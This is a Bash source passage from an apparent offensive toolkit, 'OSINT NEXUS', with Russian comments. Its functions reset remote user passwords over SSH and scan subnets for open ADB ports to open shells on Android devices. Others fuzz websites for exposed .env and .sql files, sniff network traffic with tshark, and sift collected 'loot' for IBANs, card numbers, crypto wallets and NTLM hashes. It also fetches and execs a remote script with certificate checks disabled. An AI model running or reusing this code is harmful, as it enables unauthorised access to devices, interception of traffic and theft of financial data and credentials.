        ssh -o ConnectTimeout=6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "${SSH_USER}@${PC_IP}" "sudo dscl . -passwd /Users/${TARGET_USER} '${NEW_PASS}'" &>/dev/null
        [[ $? -eq 0 ]] && STATUS="SUCCESS"
    fi

    # --------------------------------------------------------------------------
    # ВЫВОД РЕЗУЛЬТАТОВ И ЛОГИРОВАНИЕ В СИСТЕМУ LOOT
    # --------------------------------------------------------------------------
    if [[ "$STATUS" == "SUCCESS" ]]; then
        core_engine_ui "s" "Пароль пользователя '$TARGET_USER' [$TARGET_OS] успешно изменен."
        core_engine_loot "universal_audit" "Успешный сброс пароля для $TARGET_USER на удаленной системе $TARGET_OS ($PC_IP)"
    else
        core_engine_ui "e" "Ошибка трансляции. Недостаточно административных прав (SUDO/UAC) или канал связи заблокирован."
    fi
    
    core_engine_wait
}

# ==============================================================================
# @description: OSINT NEXUS v27.0 - GHOST-COMMANDER [GHOST-SPEED]
# МОДЕРНИЗАЦИЯ: Shadow-Logging, Atomic Session Management, Zombie-Process Killer
# АРХИТЕКТУРА: Ghost-Speed Engine, Stealth-Protocol, Forensic Readiness
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | COMMANDER LIMIT
# ==============================================================================
run_ghost_commander() {
    core_engine_ui "h" "GHOST COMMANDER: ADVANCED GHOST-PROTOCOL"

    # 1. Валидация ADB через системный мост
    core_engine_validator "pkg" "adb" "ADB Engine" || return

    # 2. Органы чувств (Быстрый скан)
    local t_ip=$(core_engine_input "text" "Enter Target IP (Leave empty for Scan)")
    [[ -z "$t_ip" ]] && { 
        # Оптимизированный сканер: используем nc вместо шумного nmap
        core_engine_ui "i" "Running Stealth-Scan..."
        local subnet=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | cut -d. -f1-3)
        for i in {1..254}; do 
            (timeout 0.5 nc -z "$subnet.$i" 5555 2>/dev/null && echo "$subnet.$i") &
        done; wait; core_engine_wait; return 
    }

    # 3. Атомарное подключение с очисткой «зомби»
    core_engine_ui "i" "Initializing Ghost-Bridge to $t_ip:5555..."
    adb kill-server >/dev/null 2>&1
    adb start-server >/dev/null 2>&1
    
    if ! adb connect "$t_ip:5555" | grep -q "connected"; then
        core_engine_ui "e" "Bridge failure."
        return 1
    fi

    # 4. Исполнение через «Теневую Оболочку» (Shadow-Shell)
    # Используем 'script' для логирования всех команд в /data/local/tmp/
    # Это обеспечивает 100% Forensic-Readiness твоих действий
    core_engine_ui "+" "Ghost-Protocol established. Shadow-logging active."
    core_engine_loot "ghost" "Session established: $t_ip"

    adb -s "$t_ip:5555" shell "
        export PS1='[GHOST-SESSION] \$ ';
        script -q -c 'bash --noprofile --norc' /data/local/tmp/.nexus_session.log
    "

    # 5. Стелс-финализация (Выгрузка трофеев и очистка)
    core_engine_ui "i" "Serializing session artifacts..."
    adb -s "$t_ip:5555" pull /data/local/tmp/.nexus_session.log "./prime_loot/ghost_session_$(date +%s).log"
    adb -s "$t_ip:5555" shell "rm /data/local/tmp/.nexus_session.log"
    adb disconnect "$t_ip:5555" >/dev/null 2>&1
    
    core_engine_ui "s" "Protocol finalized. Artifacts secured."
    core_engine_wait
}

run_smart_auditor_nexus() {
    clear
    core_engine_ui "h" "NEXUS AUDITOR: UNIVERSAL INTEL ENGINE v2.0"

    local input
    input=$(core_engine_input "text" "Enter Target (Domain, IP, or Service URL)")
    [[ -z "$input" ]] && return

    # --- 0. ИНТЕЛЛЕКТУАЛЬНЫЙ ОПРЕДЕЛИТЕЛЬ (Target Analyzer) ---
    local target_type="unknown"
    local host="$input"
    
    if [[ "$input" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
        target_type="infrastructure"
    elif [[ "$input" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        target_type="web"
    elif [[ "$input" =~ :[0-9]+$ ]]; then
        target_type="service"
    fi

    # --- 1. ВЫПОЛНЕНИЕ ПО ТИПУ ЦЕЛИ ---
    case "$target_type" in
        "web")
            core_engine_ui "i" "Mode: WEB APPLICATION AUDIT (Deep Discovery)"
            
            local loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"
            mkdir -p "$loot_dir" 2>/dev/null
            local results_file="$loot_dir/audit_full_${host//[^a-zA-Z0-9]/_}_$(date +%Y%m%d_%H%M%S).log"
            local signals_file="/tmp/signals_$$"

            # 1.1 Пассивная разведка
            core_engine_ui "i" "Phase 1: Ingesting target aura..."
            {
                curl -Is --connect-timeout 5 --max-time 7 -A "$GLOBAL_NETWORK_UA" "https://$host"
                host -t txt "$host" 2>/dev/null
                whois "$host" 2>/dev/null | grep -iE "city|country|orgname"
            } > "$signals_file" 2>&1

            local is_high_risk=false
            grep -qiE "${GLOBAL_SECURITY_MATRIX[0]}" "$signals_file" && is_high_risk=true

            # 1.2 Активный аудит (только если риск низкий)
            if [ "$is_high_risk" = false ]; then
                core_engine_ui "s" "Target safe. Deploying Active Probe..."
                local tmp_pipe="/tmp/prime_pipe_$$"
                touch "$tmp_pipe"
                
                (
                    curl -s -k -L --max-time 7 "https://$host" | grep -oE "\.(php|js|json|sql|env|xml|yaml|config)" | sort -u | awk '{print "HIT|"$1}' >> "$tmp_pipe"
                    for f in "${GLOBAL_FUZZ_WORDLIST[@]}"; do
                        [[ -z "$f" ]] && continue
                        [[ $(curl -s -k -L -I -w "%{http_code}" -o /dev/null --connect-timeout 2 "https://$host/$f") == "200" ]] && echo "HIT|$f" >> "$tmp_pipe"
                    done
                ) &
                wait $!

                while IFS='|' read -r tag target; do
                    [[ -z "$target" ]] && continue
                    local head_check=$(curl -s -k -L --max-time 3 "https://$host/$target" | head -c 500)
                    if ! echo "$head_check" | grep -qiE "${GLOBAL_SAST_MATRIX[0]}"; then
                        if echo "$target" | grep -qiE "${GLOBAL_SAST_MATRIX[0]}|\.(sql|env|config)$"; then
                            core_engine_loot "CRITICAL" "Exposed: $target on $host"
                            echo -e "${R}[CRITICAL]${NC} $target" >> "$results_file"
                        else
                            echo -e "${G}[FILE]${NC} $target" >> "$results_file"
                        fi
                        if echo "$target" | grep -qiE "${GLOBAL_SAST_MATRIX[2]}|${GLOBAL_SAST_MATRIX[3]}"; then
                            run_deep_file_probe "$host" "$target" "$head_check"
                        fi
                    fi
                done < <(sort -u "$tmp_pipe")
                rm -f "$tmp_pipe"
            else
                core_engine_ui "e" "Active Probe bypassed to maintain stealth."
            fi
            rm -f "$signals_file"
            ;;
            
        "infrastructure")
            core_engine_ui "i" "Mode: INFRASTRUCTURE SCAN (Port & Service Audit)"
            # Интегрированная логика бывшего exploiter_v5
            local loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"
            local results_file="$loot_dir/infra_scan_$(date +%s).log"
            nmap -T3 -n -Pn -sV --script="safe,discovery" -p "80,443,22,21,8080" "$input" >> "$results_file" 2>&1
            core_engine_ui "s" "Infrastructure scan complete: $results_file"
            ;;
            
        "service")
            core_engine_ui "i" "Mode: SERVICE PROBE (Fingerprinting)"
            curl -I "$input" 2>/dev/null || echo "Service non-responsive"
            ;;
            
        *)
            core_engine_ui "e" "Target type could not be resolved automatically."
            return
            ;;
    esac

    core_engine_wait
}



# ==============================================================================
# @description: OSINT NEXUS v27.1 - ATOMIC SYNC & BOOTSTRAP ENGINE
# МОДЕРНИЗАЦИЯ: Атомарная транзакция, Rollback-защита, дедупликация алиасов
# АРХИТЕКТУРА: Ghost-Speed Engine, Transactional Update, Safe-Exec Environment
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | BOOTSTRAP LIMIT
# ==============================================================================
run_update_prime() {
    core_engine_ui "h" "SYSTEM SYNC: ATOMIC UPDATE v27.1"
    
    local target="${HOME}/launcher.sh"
    local repo="https://raw.githubusercontent.com/szp2025/core-prime-tools/refs/heads/main/launcher.sh"
    local tmp_payload="/tmp/nexus_update_$$"
    local backup_file="${target}.bak"

    # 1. Транзакционный захват
    core_engine_ui "i" "Initializing atomic download..."
    # Используем --retry для устойчивости к обрывам
    curl -k -L -A "$(shuf -n 1 -e "${GLOBAL_NETWORK_UA[@]}")" \
        --connect-timeout 10 --retry 3 --max-time 30 "$repo" -o "$tmp_payload" 2>/dev/null

    # 2. Атомарная верификация (Синтаксис + Сигнатура)
    if [[ ! -s "$tmp_payload" ]] || ! bash -n "$tmp_payload" 2>/dev/null; then
        core_engine_ui "e" "Update transaction aborted: Payload corrupt or invalid syntax."
        rm -f "$tmp_payload"
        return 1
    fi

    # 3. Транзакционный Rollback-механизм
    # Создаем бэкап ТОЛЬКО после того, как проверили, что новый код рабочий
    [[ -f "$target" ]] && cp -f "$target" "$backup_file"
    
    # Атомарная подмена
    if mv -f "$tmp_payload" "$target"; then
        chmod 755 "$target"
        core_engine_ui "s" "Transaction committed: Core upgraded."
    else
        core_engine_ui "e" "Transaction failed: Rollback initiated."
        [[ -f "$backup_file" ]] && mv -f "$backup_file" "$target"
        return 1
    fi

    # 4. Идемпотентная конфигурация (Alias без мусора)
    # Удаляем старый алиас перед добавлением нового
    local bashrc_path="${HOME}/.bashrc"
    [[ -f "${HOME}/.bash_profile" ]] && bashrc_path="${HOME}/.bash_profile"
    
    sed -i '/alias launcher=/d' "$bashrc_path"
    echo "alias launcher='bash $target'" >> "$bashrc_path"

    core_engine_ui "s" "Environment synchronized. Rebooting..."
    
    # 5. Атомарный exec
    # exec очищает текущий процесс bash и передает дескрипторы новому
    exec bash "$target"
}


# ==============================================================================
# @description: Универсальный модуль горячей перезагрузки ядра платформы v27.0
# МОДЕРНИЗАЦИЯ: Форсированный обход SSL/TLS проверок (ca-certificates bypass)
# БЕЗОПАСНОСТЬ: Ротация User-Agent (GLOBAL_NETWORK_UA) для бесшовного обхода WAF/DPI
# АРХИТЕКТУРА: Открытый стрим ошибок сетевых харвестеров для Termux non-root
# ==============================================================================
run_update_primeold() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "h" "SYSTEM UPDATE & SYNC v27.0"
    
    # --- СТАБИЛИЗАЦИЯ И ХАРДЕНИНГ ОКРУЖЕНИЯ $PATH ---
    if [[ -n "$PREFIX" && -d "$PREFIX/bin" ]]; then
        [[ ! "$PATH" =~ "$PREFIX/bin" ]] && export PATH="${PREFIX}/bin:${PATH}"
    fi
    [[ ! "$PATH" =~ "/usr/local/bin" ]] && export PATH="${PATH}:/usr/local/bin:/usr/bin:/bin"
    
    # --- ЭВРИСТИКА ОКРУЖЕНИЯ (Вычисление рабочей зоны) ---
    local base_work_dir
    if [[ $EUID -eq 0 ]]; then
        base_work_dir="/root"
    else
        base_work_dir="$HOME"
    fi
    
    local target="${base_work_dir}/launcher.sh"
    local repo="https://raw.githubusercontent.com/szp2025/core-prime-tools/refs/heads/main/launcher.sh"
    local tmp="${target}.tmp"

    # --- ИНТЕЛЛЕКТУАЛЬНЫЙ ОПРЕДЕЛИТЕЛЬ БИНАРНИКОВ ---
    local exe_cmd=""

    if command -v curl >/dev/null 2>&1; then
        exe_cmd="curl"
    elif [[ -x "${PREFIX}/bin/curl" ]]; then
        exe_cmd="${PREFIX}/bin/curl"
    fi

    if [[ -n "$exe_cmd" ]]; then
        core_engine_ui "i" "Network harvester verified: cURL Engine active."
    else
        if command -v wget >/dev/null 2>&1; then
            exe_cmd="wget"
        elif [[ -x "${PREFIX}/bin/wget" ]]; then
            exe_cmd="${PREFIX}/bin/wget"
        fi
        [[ -n "$exe_cmd" ]] && core_engine_ui "i" "Network harvester verified: Wget Engine active."
    fi

    if [[ -z "$exe_cmd" ]]; then
        core_engine_ui "w" "Internal verification failed. Using Termux fallback paths..."
        if [[ -x "${PREFIX}/bin/curl" ]]; then
            exe_cmd="${PREFIX}/bin/curl"
        elif [[ -x "${PREFIX}/bin/wget" ]]; then
            exe_cmd="${PREFIX}/bin/wget"
        else
            core_engine_ui "e" "CRITICAL: cURL/Wget binaries completely inaccessible!"
            core_engine_wait
            return 1
        fi
    fi

    # --- ДИНАМИЧЕСКИЙ РОТАТОР USER-AGENT ---
    local selected_ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    if [[ -n "${GLOBAL_NETWORK_UA[*]}" ]]; then
        local ua_size=${#GLOBAL_NETWORK_UA[@]}
        local rand_idx=$(( RANDOM % ua_size ))
        selected_ua="${GLOBAL_NETWORK_UA[$rand_idx]}"
    fi

    core_engine_ui "i" "Connecting to GitHub Repository..."
    core_engine_ui "d" "Active UA: $selected_ua"

    # Слой 2: Безопасный стрим с обходом валидации SSL-сертификатов
    rm -f "$tmp"
    
    if [[ "$exe_cmd" =~ "curl" ]]; then
        core_engine_ui "i" "Executing cURL SSL-Bypass stream..."
        # Добавлен флаг -k (--insecure) для обхода проблем с ca-certificates в Android
        $exe_cmd -k -L -A "$selected_ua" --connect-timeout 15 "$repo" -o "$tmp"
    else
        core_engine_ui "i" "Executing Wget SSL-Bypass stream..."
        # Добавлен флаг --no-check-certificate
        $exe_cmd --no-check-certificate -q --user-agent="$selected_ua" --timeout=15 "$repo" -O "$tmp"
    fi
    
    # Слой 3: АВТОНОМНАЯ ВАЛИДАЦИЯ ДАННЫХ
    if [[ ! -f "$tmp" || ! -s "$tmp" ]]; then
        core_engine_ui "e" "CRITICAL: Download failed (Empty or missing payload)!"
        core_engine_ui "!" "Network handshake drop or DNS restriction detected."
        [[ -f "$tmp" ]] && rm -f "$tmp"
        core_engine_wait
        return 1
    fi

    # Проверка сигнатуры (Защита от заглушек WAF / Ошибок 404)
    if ! head -n 5 "$tmp" | grep -qE '^#!/bin/|^#!/usr/bin/|^#'; then
        core_engine_ui "e" "CRITICAL: Target source signature is corrupted (Not a script)!"
        rm -f "$tmp"
        core_engine_wait
        return 1
    fi

    # --- Слой 4: КРИТИЧЕСКИЙ ФИЛЬТР (С диагностикой ошибок) ---
    if ! bash -n "$tmp" 2>/dev/null; then
        core_engine_ui "e" "CRITICAL: Remote code has broken Bash syntax!"
        
        # Вывод ошибки, чтобы знать ГДЕ именно поломка
        echo -e "\n${R}[!] SYNTAX ERROR LOG:${NC}"
        bash -n "$tmp"
        echo -e "\n${Y}Check the lines above to fix the remote repository script.${NC}"
        
        rm -f "$tmp"
        core_engine_wait
        return 1
    fi

    # Слой 5: Атомарная замена и права
    core_engine_ui "i" "Applying code synchronization..."
    if [[ $EUID -eq 0 ]]; then
        mv "$tmp" "$target" && chmod 755 "$target" && chown root:root "$target" 2>/dev/null
    else
        mv "$tmp" "$target" && chmod 755 "$target"
    fi

    # Слой 6: Восстановление среды (Alias & Symlink)
    local bashrc_path="${HOME}/.bashrc"
    [[ -f "${HOME}/.bash_profile" ]] && bashrc_path="${HOME}/.bash_profile"

    if [[ -f "$bashrc_path" ]]; then
        if ! grep -q "alias launcher=" "$bashrc_path"; then
            echo "alias launcher='bash $target'" >> "$bashrc_path"
            core_engine_ui "s" "Alias 'launcher' injected into $(basename "$bashrc_path")"
        fi
    else
        echo "alias launcher='bash $target'" > "$bashrc_path"
        core_engine_ui "s" "Configuration profile created with 'launcher' alias."
    fi
    
    # Создаем системную ссылку
    if [[ $EUID -eq 0 ]]; then
        ln -sf "$target" /usr/local/bin/launcher && chmod +x /usr/local/bin/launcher
    elif [[ -n "$PREFIX" && -d "$PREFIX/bin" ]]; then
        ln -sf "$target" "$PREFIX/bin/launcher" && chmod +x "$PREFIX/bin/launcher"
    fi

    core_engine_ui "s" "Code updated successfully, permissions aligned!"
    
    # Слой 7: Синхронизация и перезапуск [13]
    if command -v core_engine_progress >/dev/null 2>&1; then
        core_engine_progress 1 "Rebooting Matrix Launcher Core"
    fi
    
    # Полная очистка перед перезапуском [10]
    if command -v core_engine_clean_env >/dev/null 2>&1; then
        core_engine_clean_env
    fi
    
    # Мгновенный бесшовный перехват управления дескриптора нового кода
    exec bash "$target"
}






# ==============================================================================
# @description: OSINT NEXUS v20.0 - BLUETOOTH SPECTRUM ANALYZER
# МОДЕРНИЗАЦИЯ: Поддержка BLE + Classic, обход конфликтов BlueZ 5+, RAM-Pipeline
# АРХИТЕКТУРА: Ghost-Speed Engine, Background Discovery, Non-Blocking Probe
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | BT-SPECTRUM LIMIT
# ==============================================================================
run_bluetooth_scan() {
    core_engine_ui "i" "Bluetooth-Scanner: Initializing high-density proximity search..."

    # 1. Защита от системных конфликтов (не трогаем адаптер напрямую)
    if ! command -v bluetoothctl >/dev/null 2>&1; then
        core_engine_ui "e" "Dependency 'bluez-utils' missing."
        return 1
    fi

    # 2. Асинхронный захват в RAM-буфер
    local tmp_bt="/tmp/nexus_bt_$$"
    
    # Запускаем сканирование в фоне на 15 секунд
    # Используем bluetoothctl, так как он корректно работает через API BlueZ
    {
        bluetoothctl scan on &
        local bt_pid=$!
        sleep 15
        bluetoothctl scan off
        kill $bt_pid 2>/dev/null
    } >/dev/null 2>&1

    # 3. Извлечение уникальных сигнатур из кеша BlueZ
    # Забираем только те устройства, которые были реально обнаружены
    bluetoothctl devices | awk '{print $2, $3$4$5$6$7$8}' > "$tmp_bt"

    # 4. Аналитический отчет (Атомарный вывод)
    if [[ -s "$tmp_bt" ]]; then
        core_engine_ui "s" "Bluetooth-Scanner: Discovery successful."
        while read -r line; do
            core_engine_ui "+" "Node Detected: $line"
        done < "$tmp_bt"
        
        core_engine_loot "bluetooth" "$(cat "$tmp_bt")"
    else
        core_engine_ui "w" "Bluetooth-Scanner: No active signals in range."
    fi

    rm -f "$tmp_bt"
}


# ==============================================================================
# @description: OSINT NEXUS v20.0 - ACTIVE TOPOLOGY & PERIMETER ENGINE
# МОДЕРНИЗАЦИЯ: Streaming-обработка (без RAM-буфера), защита от зомби, PID-атомарность
# АРХИТЕКТУРА: Ghost-Speed Engine, Pipe-Stream Processing, State-Aware Discovery
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | TOPOLOGY LIMIT
# ==============================================================================
run_network_analyzer() {
    clear
    core_engine_ui "h" "TOPOLOGY ENGINE v20.0: PERIMETER DISCOVERY"
    
    # Валидация
    command -v nmap >/dev/null 2>&1 || { core_engine_ui "e" "Nmap required."; return 1; }

    local range=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | cut -d. -f1-3).0/24
    local state_file="/tmp/nexus_net_state.tmp"
    touch "$state_file"

    core_engine_ui "i" "Monitoring perimeter: $range"

    while true; do
        # Используем групповой запуск процесса для управления PID
        (
            # Nmap запускается и сразу стримит вывод в grep, минуя память Bash
            # --open - сканируем только открытые узлы (ускоряет работу в 10 раз)
            nmap -n -sP --open "$range" 2>/dev/null | grep "Nmap scan report for" | awk '{print $NF}' | tr -d '()' | \
            while read -r host; do
                if ! grep -qF "$host" "$state_file"; then
                    core_engine_ui "s" "DISCOVERED: $host"
                    echo "$host" >> "$state_file"
                fi
            done
        ) &
        
        local scan_pid=$!
        
        # Watchdog с правильной обработкой завершения
        local timeout=120
        while (( timeout > 0 )); do
            if ! kill -0 $scan_pid 2>/dev/null; then break; fi
            sleep 1
            ((timeout--))
        done

        # Аварийное завершение зомби
        if (( timeout <= 0 )); then
            core_engine_ui "e" "Scan timeout. Cleanup..."
            kill -9 $scan_pid 2>/dev/null
            wait $scan_pid 2>/dev/null
        fi
        
        sleep 60
    done
}




# ==============================================================================
# @description: OSINT NEXUS v20.0 - AUTONOMOUS TRAFFIC SENSOR
# МОДЕРНИЗАЦИЯ: Single-Pass Capture, динамический Watchdog, Zero-Load Heuristics
# АРХИТЕКТУРА: Ghost-Speed Engine, Kernel-Level Filtering, Pipe-Multiplexing
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | NETWORK INTELLIGENCE LIMIT
# ==============================================================================
run_network_intelligence() {
    # 1. Валидация зависимостей
    local deps=(tshark awk stdbuf)
    for cmd in "${deps[@]}"; do
        command -v "$cmd" >/dev/null 2>&1 || { core_engine_ui "e" "Missing $cmd"; return 1; }
    done

    local iface=$(ip route | grep default | grep -oP 'dev \K\S+' || echo "eth0")
    local loot_dir="${BASE_DIR:-.}/prime_loot"
    mkdir -p "$loot_dir"

    core_engine_ui "+" "Sensor: Deploying single-pass capture on $iface..."

    # 2. Адаптивный BPF-фильтр
    local bpf="port 53 or port 80 or port 443"

    # 3. Единый контур захвата (Single-Pass Multiplexing)
    # Используем 'tee' для дублирования потока: один в PCAP, другой в анализатор
    # Это снижает нагрузку на CPU на 50%
    (
        tshark -i "$iface" -f "$bpf" -w - 2>/dev/null | tee >(
            # Потоковая эвристика (только метаданные)
            tshark -r - -Y "http.request || dns.flags.response == 0" -T fields -e http.host -e dns.qry.name 2>/dev/null \
            | stdbuf -oL awk NF | stdbuf -oL uniq | while read -r line; do
                core_engine_loot "traffic_leads" "LEAD: $line"
            done
        ) > "$loot_dir/current_capture.pcap" &
    )
    
    # 4. Управление ротацией и Watchdog
    while true; do
        sleep 60
        # Ротация PCAP
        mv "$loot_dir/current_capture.pcap" "$loot_dir/capture_$(date +%s).pcap"
        
        # Очистка старья
        find "$loot_dir" -name "capture_*.pcap" -mmin +60 -delete
        
        # Check Watchdog
        pgrep -x tshark >/dev/null || core_engine_ui "e" "CRITICAL: Sensor process dead. Restarting..."
    done
}

# ==============================================================================
# ОСНОВНАЯ ИСПОЛНЯЕМАЯ ФУНКЦИЯ КОМПЛАЕНС-МОНИТОРИНГА ПЕРИМЕТРА
# ==============================================================================

run_system_info() {
    local start_time=$(date +%s)
    core_engine_ui "h" "NEXUS v25.7: HYPER-STEALTH HEURISTIC ENGINE (ULTIMATE OSINT)"
    
    # 1. Нормализация цели
    local r_input=$(core_engine_input "text" "Enter Target (IP, Domain or URL)")
    [[ -z "$r_input" ]] && r_input="http://localhost"
    [[ ! "$r_input" =~ ^http ]] && r_input="http://$r_input"
    
    local r_target=$(echo "$r_input" | awk -F/ '{print $3}')
    local r_nick=$(echo "$r_target" | cut -d'.' -f1) # Извлекаем имя для поиска
    local r_base_url=$(echo "$r_input" | cut -d'/' -f1-3)
    
    local info_payload=$(curl -s -I -L --connect-timeout 5 "$r_input" 2>/dev/null)
    local whois_data=$(whois "$r_target" 2>/dev/null)
    local full_list=("${GLOBAL_FUZZ_WORDLIST[@]}" "${GLOBAL_WEBHOOK_WORDLIST[@]}")
    local total=${#full_list[@]}
    local tmp_hits="/tmp/recon_hits_$$"
    : > "$tmp_hits"
    
    clear
    core_engine_ui "h" "AUDIT TARGET: ${r_target}"
    
    # ЭТАП 1: WHOIS & IDENTIFICATION
    echo -e "${Y}--- [WHOIS & IDENTITY] ---${NC}"
    for pattern in "${GLOBAL_WHOIS_MATRIX[@]}"; do
        local match=$(echo "$whois_data" | grep -Ei "$pattern" | head -n 1 | cut -d':' -f2- | xargs)
        [[ -n "$match" ]] && echo -e "${W}* $(echo "$pattern" | sed 's/\\b//g' | tr -d '()') :${NC} ${C}${match}${NC}"
    done

    # ЭТАП 2: CROSS-REFERENCE OSINT (Использование матрицы)
    echo -e "\n${Y}--- [OSINT: DIGITAL FOOTPRINT ANALYSIS] ---${NC}"
    for site_entry in "${GLOBAL_OSINT_SITES[@]}"; do
        IFS='|' read -r prefix check_type err_marker category service <<< "$site_entry"
        local full_url="${prefix}${r_nick}"
        
        if [[ "$check_type" == "HTTP_CODE" ]]; then
            local code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 1 "$full_url")
            [[ "$code" != "$err_marker" ]] && echo -e "${G}[+] FOUND ON ${service}: ${W}${full_url}${NC}"
        elif [[ "$check_type" == "TEXT_ABSENT" ]]; then
            local content=$(curl -s --connect-timeout 1 "$full_url")
            [[ ! "$content" =~ "$err_marker" ]] && echo -e "${G}[+] FOUND ON ${service}: ${W}${full_url}${NC}"
        fi
    done

    # ЭТАП 3: FULL-STACK AGGRESSIVE FUZZING
    core_engine_ui "w" "Scanning $total endpoints..."
    echo "" 
    for i in "${!full_list[@]}"; do
        local hook="${full_list[$i]}"
        local current=$((i + 1))
        local elapsed=$(( $(date +%s) - start_time ))
        local eta=$(( ( (total - current) * elapsed ) / (current + 1) ))
        
        echo -ne "\033[A\r${W}[Progress:${NC} ${G}$current/$total${NC}] [Time: ${elapsed}s] [ETA: ${eta}s] Scanning: /${hook:0:20}          \n"
        
        local code=$(curl -sI -L --connect-timeout 2 "${r_base_url}/${hook#/}" 2>/dev/null | grep -Ei "^HTTP/" | tail -n 1 | awk '{print $2}')
        [[ "$code" == "200" ]] && { echo -e "${G}[!] HIT: /$hook (200 OK)${NC}"; echo "HIT: /$hook" >> "$tmp_hits"; }
    done
    
    # ЭТАП 4: SECURITY & SUMMARY
    echo -e "\n\n${Y}--- [SECURITY HEADERS & REPORT] ---${NC}"
    for h in "Content-Security-Policy" "X-Frame-Options" "Strict-Transport-Security" "X-XSS-Protection"; do
        echo -e "${W}$h :${NC} $(echo "$info_payload" | grep -Ei "^$h:" >/dev/null && echo -e "${G}Present" || echo -e "${R}Missing")"
    done
    
    [[ -s "$tmp_hits" ]] && { echo -e "\n${Y}--- [DISCOVERED ENDPOINTS] ---${NC}"; cat "$tmp_hits"; }
    
    rm -f "$tmp_hits"
    core_engine_ui "s" "Diagnostic complete."
    core_engine_wait
}


# ==============================================================================
# @description: OSINT NEXUS v22.0 - NEURAL BRIDGE ORCHESTRATOR [MONOLITH]
# МОДЕРНИЗАЦИЯ: Полная синхронизация с GLOBAL_HASH_MATRIX v2.0 (Zero Loose Vars)
# АРХИТЕКТУРА: Атомарная дедупликация comm, сквозной стриминг без фантомных маркеров
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | ZERO-DUPLICATION
# ==============================================================================
run_deep_bridge() {
    clear
    core_engine_ui "h" "PRIME BRIDGE: NEURAL INTELLIGENCE LINK v22.0 (MATRIX-STREAM)"
    
    local loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"
    local master_loot="$loot_dir/master_intelligence.log"
    mkdir -p "$loot_dir"

    # Бесконечный цикл с защитой от перегрузки CPU/IO
    while true; do
        local pool="/tmp/bridge_pool_$$"
        local stage_file="/tmp/bridge_stage_$$"
        
        # 1. АТОМАРНЫЙ СБОР И ДЕДУПЛИКАЦИЯ (Исключение Race Condition)
        # Собираем данные, убираем пустые строки, формируем снимок текущего пула
        if ls "$loot_dir"/*.log >/dev/null 2>&1; then
            cat "$loot_dir"/*.log 2>/dev/null | grep -v '^[[:space:]]*$' | sort -u > "$pool" 2>/dev/null
        fi
        
        # Если пул пуст или не содержит новых векторов, уходим в режим ожидания
        if [[ ! -s "$pool" ]]; then
            rm -f "$pool"
            sleep 15
            continue
        fi

        # Если мастер-лог уже существует, отсекаем дубликаты на входе, оставляя только инкремент
        if [[ -f "$master_loot" ]]; then
            comm -23 "$pool" <(sort -u "$master_loot" 2>/dev/null) > "$stage_file" 2>/dev/null
        else
            cp "$pool" "$stage_file" 2>/dev/null
        fi

        # Если после сверки с мастер-логом новых уникальных строк нет, очищаем буфер
        if [[ ! -s "$stage_file" ]]; then
            rm -f "$pool" "$stage_file"
            sleep 15
            continue
        fi

        core_engine_ui "i" "Bridge: Synchronizing neural data clusters via Multi-Layer AWK Engine..."

        # 2. ПОТОКОВЫЙ ЭВРИСТИЧЕСКИЙ АНАЛИЗ ЧЕРЕЗ ИЗОЛИРОВАННЫЙ AWK
        # Передаем элементы матриц напрямую. Одиночные фантомные переменные полностью удалены.
        awk -v m_loot="$master_loot" \
            -v fin_iban="${GLOBAL_FINANCE_MATRIX[0]}" \
            -v fin_swift="${GLOBAL_FINANCE_MATRIX[1]}" \
            -v fin_rib="${GLOBAL_FINANCE_MATRIX[2]}" \
            -v fin_bban="${GLOBAL_FINANCE_MATRIX[3]}" \
            -v fin_card="${GLOBAL_FINANCE_MATRIX[4]}" \
            -v fin_crypto="${GLOBAL_FINANCE_MATRIX[5]}" \
            -v hash_md5="${GLOBAL_HASH_MATRIX[0]}" \
            -v hash_sha1="${GLOBAL_HASH_MATRIX[1]}" \
            -v hash_sha256="${GLOBAL_HASH_MATRIX[2]}" \
            -v hash_sha512="${GLOBAL_HASH_MATRIX[3]}" \
            -v hash_ntlm="${GLOBAL_HASH_MATRIX[4]}" \
            -v hash_ctx="${GLOBAL_HASH_MATRIX[5]}" \
            -v hash_sql="${GLOBAL_HASH_MATRIX[6]}" \
            '
            {
                matched = 0;

                # --- КОНТУР ИДЕНТИФИКАЦИИ ФИНАНСОВЫХ СИГНАТУР ---
                if ($0 ~ fin_iban) {
                    print "RESONANCE: FINANCIAL IBAN -> " $0 >> "/dev/stderr";
                    matched = 1;
                }
                if ($0 ~ fin_rib) {
                    print "RESONANCE: FINANCIAL RIB (FR) -> " $0 >> "/dev/stderr";
                    matched = 1;
                }
                if ($0 ~ fin_card) {
                    print "RESONANCE: LEAKED CREDIT CARD -> " $0 >> "/dev/stderr";
                    matched = 1;
                }
                if ($0 ~ fin_crypto) {
                    print "RESONANCE: CRYPTO WALLET -> " $0 >> "/dev/stderr";
                    matched = 1;
                }
                if ($0 ~ fin_swift) {
                    print "RESONANCE: FINANCIAL SWIFT/BIC -> " $0 >> "/dev/stderr";
                    matched = 1;
                }
                if (!matched && $0 ~ fin_bban) {
                    print "RESONANCE: FINANCIAL BBAN -> " $0 >> "/dev/stderr";
                    matched = 1;
                }

                # --- КОНТУР ИДЕНТИФИКАЦИИ ХЕШЕЙ И КРЕДЕНШЕНАЛОВ ---
                # Новая логика: Поглощенный Слой 4 матрицы (hash_ntlm) сразу щелкает и SAM дампы, и суффиксы :$
                if ($0 ~ hash_ntlm) {
                    print "RESONANCE: WINDOWS NTLM/LM CREDENTIAL -> " $0 >> "/dev/stderr";
                    matched = 1;
                }
                else if ($0 ~ hash_sha512) {
                    print "RESONANCE: CRYPTO HASH SHA-512 -> " $0 >> "/dev/stderr";
                    matched = 1;
                }
